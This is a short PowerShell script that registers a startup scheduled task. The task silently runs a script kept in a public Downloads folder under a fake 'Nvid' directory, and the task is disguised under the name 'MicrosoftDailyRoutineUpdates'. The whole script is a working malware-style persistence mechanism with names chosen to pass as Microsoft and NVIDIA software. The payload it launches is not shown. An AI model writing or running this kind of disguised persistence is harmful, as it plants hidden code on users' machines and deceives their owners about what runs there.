$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NonInteractive -NoLogo -File "C:\Users\Public\Downloads\Nvid\nvidcom.ps1"'
$trigger = New-ScheduledTaskTrigger -AtStartUp
$settings = New-ScheduledTaskSettingsSet
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$principal = New-ScheduledTaskPrincipal -UserId $user -LogonType S4U 
$task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
Register-ScheduledTask MicrosoftDailyRoutineUpdates -InputObject $task